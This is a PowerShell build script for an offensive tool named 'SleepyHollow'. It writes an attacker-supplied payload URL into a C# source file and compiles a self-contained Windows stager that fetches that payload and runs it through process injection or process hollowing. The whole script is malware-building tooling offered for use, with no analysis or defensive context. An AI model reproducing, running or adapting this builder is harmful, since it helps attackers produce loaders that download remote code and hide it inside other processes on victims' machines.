param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadUrl,
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = ".\SleepyHollow.exe",
    [Parameter(Mandatory=$false, HelpMessage="Technique to use for stager")]
    [ValidateSet("Inject", "Hollow")]
    [string]$Technique = "Hollow"
)

$oldContent = [System.IO.File]::ReadAllText(".\Program.cs")

function Replace-PayloadUrl{
    param(
        [Parameter(Mandatory=$true)]
        [string]$PayloadUrl
    )

    $filePath = ".\Program.cs"
    $content = Get-Content $filePath
    $newContent = $content -replace "<%URL%>", $PayloadUrl
    Set-Content $filePath $newContent
}

function Restore-Content{
    param(
        [Parameter(Mandatory=$true)]
        [string]$oldContent
    )

    $filePath = ".\Program.cs"
    Set-Content $filePath $oldContent -Force
}

function Output-Stager{
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputPath = ".\SleepyHollow.exe"
    )
    if(Test-Path $OutputPath){
        $title    = 'File already exists'
        $question = 'Are you sure you want to proceed?'
        $choices  = '&Yes', '&No'

        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
        if ($decision -eq 0) {
            Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath -Force
        } else {
            exit
        }
    }
}

function Build-Stager{
    $projectPath = ".\SleepyHollow.csproj"
    if($Technique -eq "Inject"){
        $TECHNIQUE = "INJECT"
    }
    else{
        $TECHNIQUE = "HOLLOW"
    }
    dotnet publish -c Release /p:DefineConstants="HEADLESS%3B$TECHNIQUE" --self-contained $projectPath > $null
}

Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
Replace-PayloadUrl $PayloadUrl
Write-Progress -Activity "[SleepyHollow] Building stager..." -Status "40% Complete:" -PercentComplete 40
Build-Stager 
Restore-Content $oldContent
Output-Stager $OutputPath
Write-Progress -Activity "[SleepyHollow] Finishing up..." -Status "100% Complete:" -PercentComplete 100
